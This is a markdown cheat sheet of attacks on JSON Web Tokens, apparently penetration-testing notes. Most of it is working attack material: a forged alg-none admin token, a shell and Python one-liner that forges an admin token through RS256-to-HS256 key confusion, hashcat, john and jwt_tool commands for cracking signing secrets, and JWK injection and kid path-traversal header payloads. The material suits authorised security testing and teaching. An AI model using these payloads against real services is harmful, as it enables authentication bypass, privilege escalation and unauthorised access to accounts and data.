# JWT (JSON Web Token) Attacks

## Structure
`header.payload.signature` (base64url encoded, separated by dots)

## Common Attacks

### 1. None Algorithm
Change header to `{"alg": "none"}` and remove signature:
```
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJhZG1pbiI6IHRydWV9.
```

### 2. Algorithm Confusion (RS256 -> HS256)
If server uses RS256, change to HS256 and sign with the public key:
```bash
# Get public key
openssl s_client -connect target:443 2>/dev/null | openssl x509 -pubkey -noout > pub.pem
# Forge token signed with public key as HMAC secret
python3 -c "
import jwt
token = jwt.encode({'admin': True}, open('pub.pem').read(), algorithm='HS256')
print(token)
"
```

### 3. Weak Secret Brute Force
```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
# Using john
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256

# Using jwt_tool
python3 jwt_tool.py TOKEN -C -d wordlist.txt
```

### 4. JWK/JKU Injection
Embed attacker's public key in the token header:
```json
{"alg": "RS256", "jwk": {"kty": "RSA", "n": "...", "e": "AQAB"}}
```

### 5. Kid Injection
```json
{"alg": "HS256", "kid": "/dev/null"}
// Sign with empty string
{"alg": "HS256", "kid": "../../etc/hostname"}
// Sign with content of /etc/hostname
```

## Tools
```bash
# jwt_tool
python3 jwt_tool.py TOKEN -T  # Tamper
python3 jwt_tool.py TOKEN -X a  # Alg none attack
python3 jwt_tool.py TOKEN -X k  # Key confusion

# CyberChef for quick decode/encode
```
